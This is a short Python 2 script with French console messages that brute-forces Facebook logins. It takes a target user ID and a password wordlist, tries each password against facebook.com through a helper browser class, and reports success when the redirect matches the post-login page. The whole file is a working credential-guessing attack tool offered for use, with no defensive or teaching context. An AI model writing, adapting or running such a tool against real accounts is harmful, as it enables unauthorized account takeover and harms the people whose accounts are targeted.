#!/usr/bin/env python2
from package.browser import Browser
import argparse
import sys
from colorama import *

parser = argparse.ArgumentParser()
parser.add_argument('-u', metavar="user_id", type=str, nargs="?")
parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
args = parser.parse_args()

loginSucces = 'https://m.facebook.com/login/save-device/?login_source=login&refsrc=https%3A%2F%2Fm.facebook.com%2F&_rdr#_=_'
url = "https://www.facebook.com"


def forceIt(user_id, pass_dir):
	try:
		with open(str(pass_dir), "r") as file:
			word = file.readlines()
			print("start")
			for password in word:
				try:
					password = password[:-1]
					
					login = (Browser().login(url, 'email', user_id, 'pass', password))

					#with open("web/templates/log.html", "w") as html_page:
					#	html_page.write(login[1])
						
					if login[0] == loginSucces:
						print(Fore.GREEN+"[x] mot de pass trouver {0}".format(password))
						break

					print("\n" + Fore.RED + "[] {0}\n=> {1}".format(password, login[0]))
				except KeyboardInterrupt:
					sys.exit(1)
	except IOError:
		print("ce fichier n'existe pas")
			

if __name__ == "__main__":
	if args.u and args.p:
		forceIt(args.u, args.p)
	else:
		print("Besoin d'argument -u [user_id] -p [wordlist.txt]")
